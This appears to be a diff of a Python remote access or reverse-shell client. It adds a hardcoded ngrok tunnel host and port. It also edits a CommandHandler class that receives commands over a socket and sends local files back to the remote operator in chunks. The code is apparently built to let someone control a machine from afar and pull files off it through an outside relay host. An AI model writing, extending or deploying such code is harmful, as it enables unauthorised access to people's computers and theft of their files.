@@ -1,3 +1,6 @@
+host = '0.tcp.ngrok.io'
+port = 19285
+
 #!/usr/bin/env python
 # ---------- LIBRARIES ---------- #
 # Global (System)
@@ -50,7 +53,6 @@ class CommandHandler():
             try:
                 conn.send(str.encode('Ready'))
                 buffSize = int(conn.recv(1024).decode())
-                conn.send(str.encode(f'{os.path.getsize(command[9:])}'))
                 with open(command[9:], 'rb') as f:
                     data = f.read()
                     for i in range(len(data)//buffSize):
